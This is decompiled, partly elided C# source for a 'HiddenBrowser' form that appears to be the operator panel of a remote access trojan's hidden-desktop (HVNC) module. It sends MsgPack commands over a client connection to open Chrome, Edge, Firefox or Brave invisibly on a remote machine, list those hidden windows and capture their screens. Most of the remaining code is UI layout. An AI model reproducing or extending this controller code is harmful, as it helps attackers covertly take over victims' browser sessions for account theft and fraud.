...
public class HiddenBrowser : Form
{
    ...
    private ContextMenuStrip ContexWindowsActive;
    ...
    public Guna2DataGridView ListWindowssActive;

    private ToolStripMenuItem CloseWindow;

    private ToolStripMenuItem EdgeBrowser;

    private ToolStripMenuItem FireFoxBrowser;

    private ToolStripMenuItem BraveBrowser;

    private ToolStripMenuItem AddBrowser;
    ...
    private void HiddenBrowser_Load(object sender, EventArgs e)
    {
        ListWindowssActive.Columns[2].Visible = false;
        ListWindowssActive.Columns[3].Visible = false;
        ListWindowssActive.Columns[4].Visible = false;
    ...
    private void HiddenBrowser_Shown(object sender, EventArgs e)
    {
    ...
    private void HiddenBrowser_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "ClearList";
            msgPack.ForcePathObject("X").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Y").AsInteger = Convert.ToInt32(ViewerBox.Height);
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
    ...
    {
        string result = null;
        foreach (DataGridViewRow selectedRow in ListWindowssActive.SelectedRows)
        {
    ...
    private void GetScreen_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindowssActive.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
    ...
    private void RefrshList_Click(object sender, EventArgs e)
    {
        try
        {
            ...
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "UpdateWindowsActive";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
    ...
    private void ChromeBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            ...
            msgPack.ForcePathObject("Name").AsString = "chrome";
            msgPack.ForcePathObject("CustomName").AsString = "";
            msgPack.ForcePathObject("TitleCustomOpen").AsString = "";
            msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    ...
    private void EdgeBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenBrowser";
            msgPack.ForcePathObject("Name").AsString = "edge";
            msgPack.ForcePathObject("CustomName").AsString = "";
            msgPack.ForcePathObject("TitleCustomOpen").AsString = "";
            msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
    ...
    private void FireFoxBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenBrowser";
            msgPack.ForcePathObject("Name").AsString = "firefox";
            msgPack.ForcePathObject("CustomName").AsString = "";
            msgPack.ForcePathObject("TitleCustomOpen").AsString = "";
            msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
    ...
    private void BraveBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenBrowser";
            msgPack.ForcePathObject("Name").AsString = "brave";
            msgPack.ForcePathObject("CustomName").AsString = "";
            msgPack.ForcePathObject("TitleCustomOpen").AsString = "";
            msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
    ...
    private void HiddenBrowser_ResizeEnd(object sender, EventArgs e)
    {
        if (!WindowSize.Checked)
        {
            return;
        }
        try
    ...
    private void AddBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            ...
            {
                HbroCustomOpen hbroCustomOpen = (HbroCustomOpen)Application.OpenForms["Custom Open:" + dwid];
                if (hbroCustomOpen == null)
                {
                    using (hbroCustomOpen = new HbroCustomOpen(Client, UserIdInfo.Text, ViewerBox.Width, ViewerBox.Height))
                    {
                        hbroCustomOpen.Name = "Custom Open:" + dwid;
                        hbroCustomOpen.Text = "Custom Open";
                        hbroCustomOpen.ShowDialog();
                    }
                }
            });
        }
    ...
    private void InitializeComponent()
    {
        ...
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.HiddenBrowser));
        ...
        this.ListWindowssActive = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexWindowsActive = new System.Windows.Forms.ContextMenuStrip(this.components);
        ...
        this.EdgeBrowser = new System.Windows.Forms.ToolStripMenuItem();
        ...
        this.AddBrowser = new System.Windows.Forms.ToolStripMenuItem();
        ...
        ((System.ComponentModel.ISupportInitialize)this.ListWindowssActive).BeginInit();
        this.ContexWindowsActive.SuspendLayout();
        ...
        this.PanelMune.Location = new System.Drawing.Point(431, 112);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(246, 418);
        ...
        this.bunifuCheckBox_0.TabIndex = 672;
        ...
        this.pictureBox2.Size = new System.Drawing.Size(227, 121);
        ...
        this.MuneClose.Location = new System.Drawing.Point(225, 1);
        ...
        this.bunifuLabel17.Size = new System.Drawing.Size(246, 15);
        ...
        this.Power.Location = new System.Drawing.Point(160, 381);
        ...
        this.tableLayoutPanel1.Controls.Add(this.ListWindowssActive, 1, 0);
        ...
        this.ListWindowssActive.AllowUserToAddRows = false;
        this.ListWindowssActive.AllowUserToDeleteRows = false;
        this.ListWindowssActive.AllowUserToResizeColumns = false;
        this.ListWindowssActive.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWindowssActive.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListWindowssActive.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.ListWindowssActive.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.ListWindowssActive.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListWindowssActive.BackgroundColor = System.Drawing.Color.White;
        this.ListWindowssActive.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListWindowssActive.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWindowssActive.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListWindowssActive.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        ...
        this.ListWindowssActive.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListWindowssActive.ColumnHeadersHeight = 30;
        this.ListWindowssActive.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWindowssActive.Columns.AddRange(this.Column1, this.dataGridViewTextBoxColumn2, this.Column3, this.Column2, this.Column4);
        this.ListWindowssActive.ContextMenuStrip = this.ContexWindowsActive;
        ...
        this.ListWindowssActive.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListWindowssActive.EnableHeadersVisualStyles = false;
        this.ListWindowssActive.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWindowssActive.Location = new System.Drawing.Point(425, 3);
        this.ListWindowssActive.MultiSelect = false;
        this.ListWindowssActive.Name = "ListWindowssActive";
        this.ListWindowssActive.ReadOnly = true;
        this.ListWindowssActive.RowHeadersVisible = false;
        this.ListWindowssActive.RowHeadersWidth = 27;
        this.ListWindowssActive.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListWindowssActive.ShowCellErrors = false;
        this.ListWindowssActive.ShowEditingIcon = false;
        this.ListWindowssActive.ShowRowErrors = false;
        this.ListWindowssActive.Size = new System.Drawing.Size(233, 392);
        this.ListWindowssActive.TabIndex = 610;
        this.ListWindowssActive.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListWindowssActive.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWindowssActive.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListWindowssActive.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListWindowssActive.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListWindowssActive.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListWindowssActive.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListWindowssActive.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWindowssActive.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListWindowssActive.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListWindowssActive.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWindowssActive.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWindowssActive.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWindowssActive.ThemeStyle.HeaderStyle.Height = 30;
        this.ListWindowssActive.ThemeStyle.ReadOnly = true;
        this.ListWindowssActive.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListWindowssActive.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWindowssActive.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWindowssActive.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWindowssActive.ThemeStyle.RowsStyle.Height = 22;
        this.ListWindowssActive.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListWindowssActive.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        ...
        this.dataGridViewTextBoxColumn2.HeaderText = "Browsers List Hidden ";
        ...
        this.ContexWindowsActive.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexWindowsActive.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.GetScreen, this.browserToolStripMenuItem, this.RefrshList, this.CloseWindow });
        this.ContexWindowsActive.Name = "contextMenuStrip1";
        this.ContexWindowsActive.Size = new System.Drawing.Size(135, 108);
        this.ContexWindowsActive.TabStop = true;
        ...
        this.GetScreen.TextAlign = System.Drawing.ContentAlignment.TopRight;
        ...
        this.browserToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.ChromeBrowser, this.EdgeBrowser, this.FireFoxBrowser, this.BraveBrowser, this.AddBrowser });
        this.browserToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("browserToolStripMenuItem.Image");
        this.browserToolStripMenuItem.Name = "browserToolStripMenuItem";
        this.browserToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
        ...
        this.ChromeBrowser.Size = new System.Drawing.Size(162, 22);
        this.ChromeBrowser.Text = "Chrome Browser";
        this.ChromeBrowser.Click += new System.EventHandler(ChromeBrowser_Click);
        this.EdgeBrowser.BackColor = System.Drawing.Color.White;
        this.EdgeBrowser.Image = (System.Drawing.Image)resources.GetObject("EdgeBrowser.Image");
        this.EdgeBrowser.Name = "EdgeBrowser";
        this.EdgeBrowser.Size = new System.Drawing.Size(162, 22);
        this.EdgeBrowser.Text = "Edge Browser";
        this.EdgeBrowser.Click += new System.EventHandler(EdgeBrowser_Click);
        ...
        this.FireFoxBrowser.Size = new System.Drawing.Size(162, 22);
        this.FireFoxBrowser.Text = "Firofox Browser";
        ...
        this.BraveBrowser.Size = new System.Drawing.Size(162, 22);
        this.BraveBrowser.Text = "Brave Browser";
        this.BraveBrowser.Click += new System.EventHandler(BraveBrowser_Click);
        this.AddBrowser.BackColor = System.Drawing.Color.White;
        this.AddBrowser.Image = (System.Drawing.Image)resources.GetObject("AddBrowser.Image");
        this.AddBrowser.Name = "AddBrowser";
        this.AddBrowser.Size = new System.Drawing.Size(162, 22);
        this.AddBrowser.Text = "Add Browser";
        this.AddBrowser.Click += new System.EventHandler(AddBrowser_Click);
        ...
        this.CloseWindow.Size = new System.Drawing.Size(134, 26);
        ...
        this.bunifuLabel1.Text = "Hidden Browser";
        ...
        base.Name = "HiddenBrowser";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "HiddenBrowser";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(HiddenBrowser_FormClosing);
        base.Load += new System.EventHandler(HiddenBrowser_Load);
        base.Shown += new System.EventHandler(HiddenBrowser_Shown);
        base.ResizeEnd += new System.EventHandler(HiddenBrowser_ResizeEnd);
        ...
        ((System.ComponentModel.ISupportInitialize)this.ListWindowssActive).EndInit();
        this.ContexWindowsActive.ResumeLayout(false);
